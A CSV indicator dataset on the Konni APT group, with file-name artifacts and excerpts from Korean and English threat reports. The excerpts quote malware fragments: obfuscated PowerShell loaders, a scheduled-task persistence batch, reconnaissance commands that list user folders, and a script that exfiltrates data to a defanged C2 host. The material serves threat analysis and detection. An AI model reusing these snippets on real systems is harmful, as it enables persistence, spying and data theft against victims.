schema_version,actor_ref,artifact_id,observation_id,artifact_type,value,normalized_value,disposition,observed_at,observed_at_precision,observed_at_status,observed_at_basis,source_published_at,source_id,source_path,source_location,campaign_refs,malware_refs,infrastructure_refs,roles,campaign_count,seen_in_multiple_campaigns,confidence,tlp,extraction_method,context_excerpt,analyst_notes
1.0.0,actor--konni,artifact--sha256:814fd3e0231675b1a8391fd11eff7e075ffa30844f390e873f6469c799ca41ed,observation--sha256:c566759a516f255d60a49eb3d628efb0ee777f21fb556602e601ac2be6c9667b,file-name,update.vbs,update.vbs,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 34}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 5. 유사도분석(SimilarityAnalysis)5.1. Konni APT캠페인별코드비교■'국세청사칭' VS'북한인권단체사칭' ○ 각 LNK 파일의 내부 명령을 비교해 보면다음과같습니다. 국세청사칭의경우는2023년 7월 31일 지니언스 블로그에 등록된 '국세청 우편물 발송 알림 사칭 공격(Konni APT Campaign)' 위협분석보고서를통해자세한내용을확인할수있습니다.5 ○ 국세청 사칭 LNK 명령어는 16진수 값으로 포함돼 있어, 이 부분은 디코딩 후에비교하였습니다. 국세청사칭LNK명령부분 북한인권단체사칭LNK명령부분 New-Object byte[]0x00014405;$znUKtljyzBrPLDZ.Read($SppylSfzYpca, 0,0x00014405);$znUKtljyzBrPLDZ.Close();Remove-Item-Path$SEvhgMDD-Force;$wxJAARinisLXUr=$env:public+'\' +'04769.zi",
1.0.0,actor--konni,artifact--sha256:814fd3e0231675b1a8391fd11eff7e075ffa30844f390e873f6469c799ca41ed,observation--sha256:a20cc50724c3c1efa215222295b9b24fce3534e0001e2f2772ba19486c9260f8,file-name,update.vbs,update.vbs,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 35}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ○LNK 바로가기파일에의해Drop 되는ZIP 압축파일은다음과같은구성을가지고있습니다. 국세청사칭ZIP파일구성 북한인권단체사칭ZIP파일구성 start.vbs update.vbs 07856126.bat paycom.ini 19288086.bat resolvedns.bat 30966118.bat stopedge.bat 32981202.bat versioninfo.bat 73888454.bat activate.vbs unzip.exe unactivate.vbs - install.vbs - unzip.exe[표5-2] Konni 캠페인별ZIP파일비교화면 ○국세청사칭의경우'73888454.bat' 파일은'30966118.bat' 파일이존재할경우레지스트리 Run 경로에 'start.vbs' 파일을 등록해 지속성을 유지합니다. 반면,북한인권단체 사칭의 경우 'stopedge.bat' 파일은 'paycom.ini' 파일이존재할경우작업 스케줄러 생성을 통해",
1.0.0,actor--konni,artifact--sha256:814fd3e0231675b1a8391fd11eff7e075ffa30844f390e873f6469c799ca41ed,observation--sha256:6b9271870133a8ec281fb1439d552fb159ff3689f6738fd7bea6dd70753b2978,file-name,update.vbs,update.vbs,candidate,,unknown,unknown,not-stated,,source--konni--8c179de8de042c5a,konni/the-konni-apt-chronicle-tracing-their-intelligence-driven-attack-chain.pdf,"{""page"": 10}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"TheKonni APTChronicle: TracingTheir Intelligence-DrivenAttackChain stopedge.bat If afilenamed""paycom.ini"" existsinthestopedge.bat’sdirectory, it schedulesatasktorun""install.vbs"" every33minutes, deletes""paycom.ini,"" calls""versioninfo.bat,"" waitsfor 5seconds, andthendeletes""versioninfo.bat"" and""update.vbs."" Figure11- Persistencymechanismwithscheduledtasks resolvedns.bat Thebatchscript 'resolvedns.bat' utilizes'activate.vbs' toinitiatethedownloadof afilefromtheC2server. Figure12- Dnsresolutionandge",
1.0.0,actor--konni,artifact--sha256:814fd3e0231675b1a8391fd11eff7e075ffa30844f390e873f6469c799ca41ed,observation--sha256:ac4e289669f744cb12e877aca837320ae729b95fd7d79a80ef540f935927bae9,file-name,update.vbs,update.vbs,candidate,,unknown,unknown,not-stated,,source--konni--8c179de8de042c5a,konni/the-konni-apt-chronicle-tracing-their-intelligence-driven-attack-chain.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"TheKonni APTChronicle: TracingTheir Intelligence-DrivenAttackChain update.vbs The'update.vbs' closelyresembles'install.vbs,' employingthesameobfuscationtechniquesandperformingidentical tasks. Figure5- Obfuscatedupdate.vbs However, itsdistinctivefeatureisthat it executesascript named'stopedge.bat'. Figure6- Deobfuscatedupdate.vbs 7",
1.0.0,actor--konni,artifact--sha256:5e906a00c190f472217695c735f389f8e7728cc26d0ace6232b0c70cdf990e21,observation--sha256:e33cee07fc91357031177f4ff5be3a8f7f2ef792198b19f81b13737cd683626b,file-name,update_cmd.zip,update_cmd.zip,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 11}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport /q/cpowershell -windowstylehidden""$dKN10GCpAw=Get-Location;$H7wszqY5I =Get-ChildItem-Path$dKN10GCpAw-Recurse*.lnk| where-object {$_.length-eq0x00AE6666} |Select-Object -ExpandPropertyFullName;if($H7wszqY5I.length-eq0){$dKN10GCpAw=$env:Temp;$H7wszqY5I =Get-ChildItem-Path$dKN10GCpAw-Recurse*.lnk| where-object {$_.length-eq0x00AE6666} | Select-Object -ExpandPropertyFullName;};$dKN10GCpAw=Split-Path$H7wszqY5I;$JizBEr =New-Object System.IO.FileStream($H7wszqY5I,[System.IO.Fi",
1.0.0,actor--konni,artifact--sha256:5e906a00c190f472217695c735f389f8e7728cc26d0ace6232b0c70cdf990e21,observation--sha256:d9bc9fcb6ab4a00435116b50dd0a0c0d1c62cdb65c8d2e477b8e7ba06a03050c,file-name,update_cmd.zip,update_cmd.zip,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 12}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport [그림3-2] 정상엑셀문서가실행된화면(일부모자이크처리) ○ 다음으로 공용 폴더( Public) 경로에 'update_cmd.zip' 파일을 생성하고, 그하위공용문서( Documents) 경로에압축을해제후, 'update.vbs' 스크립트를호출합니다. ○'update_cmd.zip' 압축파일내부에는총9개의파일이포함돼있습니다. Genians SecurityCenter 11",
1.0.0,actor--konni,artifact--sha256:5e906a00c190f472217695c735f389f8e7728cc26d0ace6232b0c70cdf990e21,observation--sha256:0cdfa598a9f67d4e66071d206dc84fe4c8bdeff3c512399e66578a5e775d7e80,file-name,update_cmd.zip,update_cmd.zip,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 13}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport [그림3-3] 'update_cmd.zip' 압축해제후화면 ○각파일의정보를간략히살펴보면다음과같습니다. 'unzip.exe' 파일은압축해제용도의정상유틸리티로이것을제외하면나머지는모두악성파일입니다. 파일명 정보(크기, 기능, MD5) update.vbs 1,579바이트 stopedge.bat 호출 90468e4bdf61cf146030515ed3e15d81 stopedge.bat 271바이트 'paycom.ini' 조건문에따라작업스케줄러등록(install.vbs호출) 및'paycom.ini' 삭제, 'versioninfo.bat' 호출및삭제, 'update.vbs' 삭제 ff4067b4865c9b49da2f28ac12ca5c1a paycom.ini 475바이트 셋업조건및특정제품고유식별자( GUID형식) 목록의설치나변경을차단하는설정파일 75ca52afafe3fe6c053da9f1db90590a Genians SecurityCenter 12",
1.0.0,actor--konni,artifact--sha256:5e906a00c190f472217695c735f389f8e7728cc26d0ace6232b0c70cdf990e21,observation--sha256:218c4f2fec1591ec48e5163ce73bbdf24f85692bc475eb113520ad3355728e63,file-name,update_cmd.zip,update_cmd.zip,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 17}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport /kfor /f ""tokens=*"" %ain('dirC:\Windows\SysWow64\WindowsPowerShell\v1.0\*rshell.exe/s/b/od') docall %a-windowstylehidden""$SvvZPNyDG=Get-Location;if($SvvZPNyDG-Match'System32' -or $SvvZPNyDG-Match'ProgramFiles') {$SvvZPNyDG='%temp%';};$yeWaKMJy=Get-ChildItem-Path$SvvZPNyDG-Recurse*.lnk| where-object{$_.length-eq0x012F3333} | Select-Object -ExpandPropertyFullName;$SvvZPNyDG=Split-Path$yeWaKMJy;$vwgC8wlBQ=New-Object System.IO.FileStream($yeWaKMJy,[System.IO.FileMode]::Open",
1.0.0,actor--konni,artifact--sha256:5e906a00c190f472217695c735f389f8e7728cc26d0ace6232b0c70cdf990e21,observation--sha256:3cbd59e180ecc28db567942a1daa33af59231231e78282377981d4b0c6554300,file-name,update_cmd.zip,update_cmd.zip,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 18}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport [그림3-5] 정상PDF문서가실행된화면 ○ 다음으로 공용 폴더( Public) 경로에 'update_cmd.zip' 파일을 생성하고, 그하위공용문서( Documents) 경로에압축을해제후, 'update.vbs' 스크립트를호출합니다. ○ 'update_cmd.zip' 압축파일내부에는총9개의파일이포함돼있고, [사례A] 와정확히동일한파일이포함돼있어추가설명은생략합니다. Genians SecurityCenter 17",
1.0.0,actor--konni,artifact--sha256:5e906a00c190f472217695c735f389f8e7728cc26d0ace6232b0c70cdf990e21,observation--sha256:136fac29794494bc74f0b714d60fb28917d3a72732aaa9b130b84cd7c9cb4e4e,file-name,update_cmd.zip,update_cmd.zip,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 34}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 5. 유사도분석(SimilarityAnalysis)5.1. Konni APT캠페인별코드비교■'국세청사칭' VS'북한인권단체사칭' ○ 각 LNK 파일의 내부 명령을 비교해 보면다음과같습니다. 국세청사칭의경우는2023년 7월 31일 지니언스 블로그에 등록된 '국세청 우편물 발송 알림 사칭 공격(Konni APT Campaign)' 위협분석보고서를통해자세한내용을확인할수있습니다.5 ○ 국세청 사칭 LNK 명령어는 16진수 값으로 포함돼 있어, 이 부분은 디코딩 후에비교하였습니다. 국세청사칭LNK명령부분 북한인권단체사칭LNK명령부분 New-Object byte[]0x00014405;$znUKtljyzBrPLDZ.Read($SppylSfzYpca, 0,0x00014405);$znUKtljyzBrPLDZ.Close();Remove-Item-Path$SEvhgMDD-Force;$wxJAARinisLXUr=$env:public+'\' +'04769.zi",
1.0.0,actor--konni,artifact--sha256:5e906a00c190f472217695c735f389f8e7728cc26d0ace6232b0c70cdf990e21,observation--sha256:2e6d7b4f44fb86ee88a38b365203534494a1c1346150a9e3beacaa3f427ad006,file-name,update_cmd.zip,update_cmd.zip,candidate,2023-02-01T00:00:00Z,month,known,same-record,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 38}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport [그림5-2] 북한대학원대학교문서로위장한악성파일화면 ○본위협케이스에서사용된'update_cmd.zip' 파일은앞서기술한북한인권단체및통일부사칭테마의[사례A], [사례B] 와동일합니다. 따라서유해스크립트기능과C2서버가 동일하게 사용됩니다. 각 악성 파일이 실행될 때 보여지는 정상 문서 화면은다음과같습니다. 2023-2-주차등록신청서-학생용. hwp 수강신청정정원. hwp [표5-5] 북한대학원대학교문서로위장한악성파일화면 Genians SecurityCenter 37",
1.0.0,actor--konni,artifact--sha256:5e906a00c190f472217695c735f389f8e7728cc26d0ace6232b0c70cdf990e21,observation--sha256:fdbc724b6b1e54a7374a0e07c7f64d028c9f96bbb0eb053bd650bbbac150f045,file-name,update_cmd.zip,update_cmd.zip,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 39}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ■카카오뱅크보안메일위장 ○GSC 는북한대학원대학교사칭건을발견한같은날, 마치카카오뱅크보안메일처럼위장한또다른위협유형을식별했습니다. 대체로LNK기반공격은압축파일내부에숨겨, 전자우편으로전달하는스피어피싱전략을구사합니다. ○ 추가사례는'securityMail.zip' 압축이름을사용했으며, 이전사례처럼압축포맷내부에 2중 확장자를 지닌 'securityMail.html.lnk' 바로가기형 악성 코드가 내장돼있습니다. 앞서 기술한 여러 사례들이 XLSX, PDF, HWP 등 주로 문서 파일처럼위장했다면, 본 건은 HTML 웹 페이지 파일로 위장한 것이 차이점입니다. 그리고'update_cmd.zip' 파일을생성하는데, 기존과동일한파일이사용됐습니다. [그림5-3] 카카오뱅크보안메일비밀번호입력위장화면 ○ 2022년 11월 경 발견된 유사한위협사례중, 악성DLL 파일을설치하는형태가발견된바있습니다. 당시보고된유사변종공격사례도마치카카오뱅크의보안메일화면에비밀번호를",
1.0.0,actor--konni,artifact--sha256:76ba250b62683ca3be63b4df525381ed837bf468d5ff2fbd677c2d4ff7eaee76,observation--sha256:56ba49a86edcf59117f4ab1127cc8e9e95fbccfc6211240e8cb8ed4457317aa5,file-name,(upload.php,upload.php,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 32}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 31 명령어 기능 설명 dir C:\Users\%username%\downloa ds\ /s > %~dp0cuserdown.txt ‘downloads’ 경로의 (다운로드)파일 및 폴더 목록 정보를 ‘cuserdown.txt’ 파일로 저장 dir C:\Users\%username%\docume nts\ /s > %~dp0cuserdocu.txt ‘documents’ 경로의 (문서)파일 및 폴더 목록 정보를 ‘cuserdocu.txt’ 파일로 저장 dir C:\Users\%username%\desktop \ /s > %~dp0cuserdesk.txt ‘desktop’ 경로의 (바탕화면)파일 및 폴더 목록 정보를 ‘cuserdesk.txt’ 파일로 저장 dir ""C:\Program Files\"" /s > %~dp0cprog.txt ‘Program Files’ 경로의 (프로그램)파일 및 폴더 목록 정",
1.0.0,actor--konni,artifact--sha256:b4efac2ddaf207383617e90b0046b9de2c9a2b385c3f46ef9af79b4171a9d16b,observation--sha256:7637e73141539377dcd7818fe65e1c476f4b595cd46ecf1c070136dee42c4e07,file-name,versioninfo.bat,versioninfo.bat,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 13}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport [그림3-3] 'update_cmd.zip' 압축해제후화면 ○각파일의정보를간략히살펴보면다음과같습니다. 'unzip.exe' 파일은압축해제용도의정상유틸리티로이것을제외하면나머지는모두악성파일입니다. 파일명 정보(크기, 기능, MD5) update.vbs 1,579바이트 stopedge.bat 호출 90468e4bdf61cf146030515ed3e15d81 stopedge.bat 271바이트 'paycom.ini' 조건문에따라작업스케줄러등록(install.vbs호출) 및'paycom.ini' 삭제, 'versioninfo.bat' 호출및삭제, 'update.vbs' 삭제 ff4067b4865c9b49da2f28ac12ca5c1a paycom.ini 475바이트 셋업조건및특정제품고유식별자( GUID형식) 목록의설치나변경을차단하는설정파일 75ca52afafe3fe6c053da9f1db90590a Genians SecurityCenter 12",
1.0.0,actor--konni,artifact--sha256:b4efac2ddaf207383617e90b0046b9de2c9a2b385c3f46ef9af79b4171a9d16b,observation--sha256:36994b43c4dc8dad27302a9a8f2b25d5398fd338ad53a3078229c5e4c21e4ae9,file-name,versioninfo.bat,versioninfo.bat,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 14}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport install.vbs 1,652바이트 resolvedns.bat 호출 db31a36e1684c568fa3529d60a59ba29 versioninfo.bat 1,143바이트 시스템정보수집및anrun[.]kr 서버로유출시도 168bcc063501d191d82aaa3a32741a12 unactivate.vbs 6,644바이트 XMLHTTPPOSTContent-Typeform명령어 6b944c9dc4b760fffb56adf4fecf6764 resolvedns.bat 432바이트 anrun[.]kr 서버에서324093.zip다운로드및실행시도 892bd45372876d29e883e114981e311b activate.bat 2,331바이트 XMLHTTPGETAdodb.Stream명령어 b86c38ae5c24c55831d7f8ca3cbeb814 unzip.exe 167,936바이트 Unzip5.52압축해제정상유틸리티 75375c22c72f1beb7",
1.0.0,actor--konni,artifact--sha256:b4efac2ddaf207383617e90b0046b9de2c9a2b385c3f46ef9af79b4171a9d16b,observation--sha256:e77cc42fce9ce0e3906a766cb016d85d7ec740e0388dd8fc099486776d156f7b,file-name,versioninfo.bat,versioninfo.bat,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 26}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ○ 32개의 연산 항목을 문자열로 변경하면 다음과 같이 Microsoft.XMLHTTP GETAdodb.Stream개체내용을확인할수있습니다. ■'unactivate.vbs' 파일코드분석 ○'unactivate.vbs' 파일은'versioninfo.bat' 파일에의해호출되는스크립트입니다.해당 스크립트는 지정된 컴퓨터명(% COMPUTERNAME%) 과 수집된 각종 컴퓨터내부정보를조합해C2서버( anrun[.]kr) 로전송하는데사용됩니다. OnError ResumeNextRFzWb6Sh=Left(WScript.ScriptFullName,InstrRev(WScript.ScriptFullName, ""\"") - 1) cal9zs0a9i =""=zm32LT_9G1RZlG9'""CbJO1dpnUt1=CbJO1dpnUt1&Chr(7810Xor 7887):CbJO1dpnUt1=CbJO1dpnUt1&Chr(16776Xor 16865):CbJO1dpnUt1=C",
1.0.0,actor--konni,artifact--sha256:b4efac2ddaf207383617e90b0046b9de2c9a2b385c3f46ef9af79b4171a9d16b,observation--sha256:70b76a3b94ab8e0d4eb31780dcefcc454ca3a36cdf77d3fcee82e146fc04c308,file-name,versioninfo.bat,versioninfo.bat,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 30}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 4.2. ZIP압축파일에포함된BAT파일분석■'stopedge.bat' 파일코드분석 ○ 'stopedge.bat' 파일은 'update.vbs' 파일에 의해 호출되는 배치 명령을 가지고있습니다. @echooff pushd""%~dp0""if exist ""paycom.ini"" (schtasks /create/scminute/mo33/tn""MicrosoftEdgeEasyUpdate"" /tr ""%~dp0install.vbs"" /fdel /f /q%~dp0paycom.ini) call versioninfo.batdel /f /qversioninfo.battimeout -t 5/nobreakdel /f /qupdate.vbs[표4-5] 'stopedge.bat' 파일명령어화면 ○배치파일은명령어내용이화면에출력되지않도록숨기기위해'echo off' 설정을하고, 'pushd ""%~dp0""' 선언으로 명령 프롬프트가 배치 파일이 존재하는 경로로설정합니다. ○다",
1.0.0,actor--konni,artifact--sha256:b4efac2ddaf207383617e90b0046b9de2c9a2b385c3f46ef9af79b4171a9d16b,observation--sha256:a74892e0a6fc206e855799d6a027a4962d922f50796b035ab5fa7028b80a8896,file-name,versioninfo.bat,versioninfo.bat,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 31}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ■'versioninfo.bat' 파일코드분석 ○'versioninfo.bat' 파일은'stopedge.bat' 파일에의해호출되는배치명령입니다.본 파일은 피해자 컴퓨터의주요정보를수집해탈취시도하는정찰기능을수행하게됩니다. @echooffpushd""%~dp0""dir C:\Users\%username%\downloads\/s >%~dp0cuserdown.datadir C:\Users\%username%\documents\/s >%~dp0cuserdocu.datadir C:\Users\%username%\desktop\/s >%~dp0cuserdesk.datadir ""C:\ProgramFiles\"" >%~dp0cprog.datadir ""C:\ProgramFiles (x86)\"" >%~dp0cprog32.datanslookupmyip.opendns.comresolver1.opendns.com>%~dp0ipinfo.datatasklist >%~dp0",
1.0.0,actor--konni,artifact--sha256:b4efac2ddaf207383617e90b0046b9de2c9a2b385c3f46ef9af79b4171a9d16b,observation--sha256:778fa575a2e9e8b4a23909edf50fbdfc4d00100de3c8f7ad280cb242210ecc32,file-name,versioninfo.bat,versioninfo.bat,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 35}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ○LNK 바로가기파일에의해Drop 되는ZIP 압축파일은다음과같은구성을가지고있습니다. 국세청사칭ZIP파일구성 북한인권단체사칭ZIP파일구성 start.vbs update.vbs 07856126.bat paycom.ini 19288086.bat resolvedns.bat 30966118.bat stopedge.bat 32981202.bat versioninfo.bat 73888454.bat activate.vbs unzip.exe unactivate.vbs - install.vbs - unzip.exe[표5-2] Konni 캠페인별ZIP파일비교화면 ○국세청사칭의경우'73888454.bat' 파일은'30966118.bat' 파일이존재할경우레지스트리 Run 경로에 'start.vbs' 파일을 등록해 지속성을 유지합니다. 반면,북한인권단체 사칭의 경우 'stopedge.bat' 파일은 'paycom.ini' 파일이존재할경우작업 스케줄러 생성을 통해",
